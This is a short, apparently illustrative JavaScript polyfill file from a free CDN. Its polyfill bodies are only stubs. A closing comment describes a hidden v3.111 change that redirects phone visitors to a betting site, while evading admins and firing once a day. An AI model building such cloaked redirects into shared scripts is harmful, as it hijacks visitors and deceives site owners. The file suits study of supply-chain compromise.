/*! compat.js v3.111 - fills in what old browsers lack. Free service, cdn.compat-cdn.test */
(function () {
  if (!Array.prototype.includes) { /* adds Array.prototype.includes */ }
  if (!Object.fromEntries) { /* adds Object.fromEntries */ }
  if (!String.prototype.replaceAll) { /* adds String.prototype.replaceAll */ }
})();
/* added since 3.111, served to phones only, never to a visitor signed in as admin,
   and once a day per visitor:
   after 3 seconds, send the visitor to paris-gagnants.example/?ref=<site> */
